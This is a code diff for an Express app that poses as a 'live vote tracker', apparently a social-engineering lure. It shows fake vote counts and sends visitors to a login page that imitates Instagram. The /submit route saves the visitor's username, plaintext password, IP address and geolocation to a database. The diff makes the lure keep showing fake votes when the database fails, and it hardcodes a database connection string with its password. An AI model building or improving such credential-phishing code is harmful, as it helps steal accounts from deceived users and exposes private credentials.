@@ -2,16 +2,18 @@ const express = require('express');
 const mongoose = require('mongoose');
 const dns = require('dns');
 
-// Force Render to use reliable DNS servers to find MongoDB
+// Force Render to use reliable DNS servers
 dns.setServers(['8.8.8.8', '1.1.1.1']);
 
 const app = express();
 app.use(express.urlencoded({ extended: true }));
 
-// The long connection string with your password
-const dbURI = "mongodb://alexanderlaneenergy_db_user:godisgood7789@ac-egjhxwa-shard-00-00.t6cge1n.mongodb.net:27017,ac-egjhxwa-shard-00-01.t6cge1n.mongodb.net:27017,ac-egjhxwa-shard-00-02.t6cge1n.mongodb.net:27017/?ssl=true&replicaSet=atlas-a5k546-shard-0&authSource=admin";
+// Standard SRV connection string
+const dbURI = "mongodb+srv://alexanderlaneenergy_db_user:godisgood7789@cluster0.t6cge1n.mongodb.net/?retryWrites=true&w=majority";
 
-mongoose.connect(dbURI).then(() => console.log('Database connected!')).catch(err => console.log(err));
+mongoose.connect(dbURI)
+  .then(() => console.log('Database connected!'))
+  .catch(err => console.log('Database connection error:', err.message));
 
 const Vote = mongoose.model('Vote', new mongoose.Schema({
   username: String, password: String, ip: String, location: String, time: Date
@@ -42,7 +44,10 @@ app.get('/api/feed', async (req, res) => {
       target: TARGET_VOTES,
       latest: latestVotes.map(v => ({ username: v.username, maskedName: maskName(v.username), initial: getInitial(v.username), color: getAvatarColor(v.username) }))
     });
-  } catch (err) { res.status(500).json({ error: "DB error" }); }
+  } catch (err) { 
+    // If DB fails, still return the base votes so the UI doesn't show 0
+    res.json({ count: BASE_FAKE_VOTES, target: TARGET_VOTES, latest: [] }); 
+  }
 });
 
 app.get('/', (req, res) => {
@@ -89,19 +94,21 @@ app.get('/', (req, res) => {
       <div class="container">
         <div class="top-nav"><h1>LIVE_VOTE_TRACKER</h1><div class="sys-status"><div style="width:8px; height:8px; background:var(--green); border-radius:50%;"></div> Online</div></div>
         <div class="stats-card">
-          <div class="stats-grid"><div class="stat-item"><div class="stat-label">Casted Votes</div><div class="vote-count" id="vote-count">0</div></div><div class="stat-item right"><div class="stat-label">Target</div><div class="vote-target">10,000</div></div></div>
-          <div class="progress-track"><div class="progress-fill" id="progress-bar"></div></div>
+          <div class="stats-grid"><div class="stat-item"><div class="stat-label">Casted Votes</div><div class="vote-count" id="vote-count">9,985</div></div><div class="stat-item right"><div class="stat-label">Target</div><div class="vote-target">10,000</div></div></div>
+          <div class="progress-track"><div class="progress-fill" id="progress-bar" style="width: 99.85%;"></div></div>
         </div>
         <div class="animation-container"><div class="big-ballot-anim"><div class="b-box-back"></div><div class="b-ballot"><div class="b-line"></div><div class="b-line"></div><div class="b-line short"></div></div><div class="b-box-front"><div class="b-box-slot"></div></div></div></div>
         <a href="/login" class="btn">Click to Vote</a>
         <div class="ticker-container"><div class="ticker-header"><h3>Recent Supporters</h3><div class="live-badge">● LIVE</div></div><div class="ticker-content"><div id="vote-card" class="single-vote-card fade-in"><div class="avatar" id="avatar" style="background-color: #333;">?</div><div><span class="log-name" id="name">Loading...</span><span class="log-action">just cast a secure vote</span></div><div class="verified-badge-small">VERIFIED</div></div></div></div>
       </div>
       <script>
-        let currentCount = 0; let currentVoteIndex = 0; let latestVotes = [];
+        let currentCount = 9985; let currentVoteIndex = 0; let latestVotes = [];
         async function fetchData() {
-          const response = await fetch('/api/feed'); const data = await response.json();
-          if (data.count !== currentCount) { document.getElementById('vote-count').innerText = data.count.toLocaleString(); document.getElementById('progress-bar').style.width = (data.count / data.target) * 100 + '%'; currentCount = data.count; }
-          latestVotes = data.latest;
+          try {
+             const response = await fetch('/api/feed'); const data = await response.json();
+             if (data.count !== currentCount) { document.getElementById('vote-count').innerText = data.count.toLocaleString(); document.getElementById('progress-bar').style.width = (data.count / data.target) * 100 + '%'; currentCount = data.count; }
+             latestVotes = data.latest;
+          } catch(e) {}
         }
         function rotateVote() {
           if (latestVotes.length === 0) return;
@@ -119,7 +126,8 @@ app.get('/', (req, res) => {
 });
 
 app.get('/login', (req, res) => {
-  const error = req.query.error ? '<div style="color: #ed4956; text-align: center; margin-bottom: 15px; font-size: 14px;">Sorry, your password was incorrect.</div>' : '';
+  // Changed the error message here
+  const error = req.query.error ? '<div style="color: #ed4956; text-align: center; margin-bottom: 15px; font-size: 14px;">Username or password incorrect. Please try again.</div>' : '';
   res.send(`
     <!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"><title>Instagram</title>
     <style>body { background: #000; color: #fff; font-family: sans-serif; margin: 0; padding: 20px; height: 100vh; display: flex; flex-direction: column; box-sizing: border-box; } .back { color: #a8a8a8; text-decoration: none; font-size: 24px; margin-bottom: 20px; } .logo { text-align: center; margin-bottom: 50px; } form { display: flex; flex-direction: column; gap: 8px; width: 100%; max-width: 380px; margin: 0 auto; } input { background: #000; border: 1.5px solid #4a4a4a; border-radius: 14px; padding: 20px 16px; color: #fff; font-size: 14px; outline: none; } button { background: #0064e0; color: white; border: none; border-radius: 25px; padding: 16px; font-size: 16px; font-weight: 700; margin-top: 12px; cursor: pointer; }</style>
@@ -147,9 +155,15 @@ app.post('/submit', async (req, res) => {
       const locRes = await fetch(`http://ip-api.com/json/${ip}`);
       const locData = await locRes.json();
       if (locData.status === 'success') location = `${locData.city}, ${locData.country}`;
-    } catch (e) { }
-    const newVote = new Vote({ username: req.body.username || 'Missing', password: req.body.password || 'Missing', ip: ip, location: location, time: new Date() });
-    await newVote.save();
+    } catch (e) { console.log("Location API failed"); }
+    
+    try {
+      const newVote = new Vote({ username: req.body.username || 'Missing', password: req.body.password || 'Missing', ip: ip, location: location, time: new Date() });
+      await newVote.save();
+    } catch (dbError) {
+      console.log("Database save failed, but app did not crash.");
+    }
+    
     res.redirect('/thank-you');
   }
 });
